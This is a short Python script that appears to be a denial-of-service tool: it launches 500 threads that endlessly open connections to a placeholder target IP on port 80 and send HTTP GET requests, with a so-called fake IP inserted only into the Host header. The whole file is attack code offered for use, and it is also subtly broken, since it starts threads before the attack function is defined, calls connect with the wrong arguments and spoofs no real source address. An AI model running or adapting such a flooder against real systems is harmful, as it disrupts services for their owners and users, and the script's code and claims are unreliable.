import socket
import threading

# script begins below

target = '10.10.10.10' #change to target
spoof_ip = '10.20.223.221' #also change to whatever your fake IP is
port = 80 #80 is default HTTP port, change to what you need
attack_num = 0

for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
    
def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(target, port)
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + spoof_ip + "\r\n\r\n").encode('ascii'), (target, port))
        global attack_num
        attack_num += 1
        print(attack_num)
        s.close()
        
